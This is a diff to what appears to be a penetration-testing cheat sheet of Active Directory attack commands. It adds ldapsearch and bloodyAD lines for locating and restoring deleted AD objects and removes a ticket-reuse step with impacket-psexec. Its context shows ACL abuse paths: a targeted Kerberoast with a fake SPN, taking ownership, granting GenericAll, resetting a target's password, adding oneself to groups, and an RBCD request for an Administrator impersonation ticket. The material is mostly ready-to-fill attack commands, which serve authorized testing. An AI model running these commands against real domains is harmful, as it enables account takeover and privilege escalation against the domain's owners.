@@ -89,6 +89,16 @@ bloodyAD -u <USER> -p '<PASSWORD>' -d <DOMAIN> --dc-ip <DC_IP> add groupMember <
 bloodyAD -u <USER> -p '<PASSWORD>' -d <DOMAIN> --dc-ip <DC_IP> remove groupMember <GROUP> <USER_TO_REMOVE>
 ```
 
+### Recover Deleted AD Objects
+
+```bash
+# Search for deleted AD objects (-x: simple auth)
+ldapsearch -x  -s sub "(isDeleted=TRUE)" -E '!1.2.840.113556.1.4.417' -H ldap://<DC_IP> -D '<USER>@<DOMAIN>' -w '<PASSWORD>' -b "CN=Deleted Objects,DC=<DOMAIN_SUB>,DC=<DOMAIN_TOPLEVEL>"
+
+# Bring object back to life
+bloodyAD -d <DOMAIN> -u <USER> -p '<PASSWORD>' --host <DC_FQDN> --dc-ip <DC_IP> set restore 'CN=<OBJECT_CN>\0ADEL:<USER_SID>,CN=Deleted Objects,DC=<DOMAIN_SUB>,DC=<DOMAIN_TOPLEVEL>'
+```
+
 ## ACL Abuse Paths
 
 ### `GenericAll` / `GenericWrite` (Targeted Kerberoast)
@@ -102,7 +112,7 @@ bloodyAD -u <USER> -p '<PASSWORD>' -d <DOMAIN> --dc-ip <DC_IP> set object <TARGE
 bloodyAD -u <USER> -p '<PASSWORD>' -d <DOMAIN> --dc-ip <DC_IP> remove object <TARGET_USER> servicePrincipalName -v 'fake/<TARGET_USER>'
 ```
 
-### `WriteOwner` -- Take Ownership + Grant Rights
+### `WriteOwner`: Take Ownership + Grant Rights
 
 ```bash
 # Take ownership
@@ -115,7 +125,7 @@ bloodyAD -u <USER> -p '<PASSWORD>' -d <DOMAIN> --dc-ip <DC_IP> add genericAll <T
 bloodyAD -u <USER> -p '<PASSWORD>' -d <DOMAIN> --dc-ip <DC_IP> set password <TARGET_USER> '<NEW_PASSWORD>'
 ```
 
-### `AddSelf` -- Add Self to Group
+### `AddSelf`: Add Self to Group
 
 ```bash
 bloodyAD -u <USER> -p '<PASSWORD>' -d <DOMAIN> --dc-ip <DC_IP> add groupMember <GROUP> <USER>
@@ -140,8 +150,4 @@ bloodyAD -u <USER> -p '<PASSWORD>' -d <DOMAIN> --dc-ip <DC_IP> add rbcd <TARGET_
 
 # Request impersonation ticket
 impacket-getST -spn 'cifs/<TARGET_COMPUTER_FQDN>' -impersonate Administrator <DOMAIN>/'FAKE01$':'<NEW_PASS>' -dc-ip <DC_IP>
-
-# Use ticket
-export KRB5CCNAME=Administrator.ccache
-impacket-psexec -k -no-pass <DOMAIN>/Administrator@<TARGET_COMPUTER_FQDN>
 ````
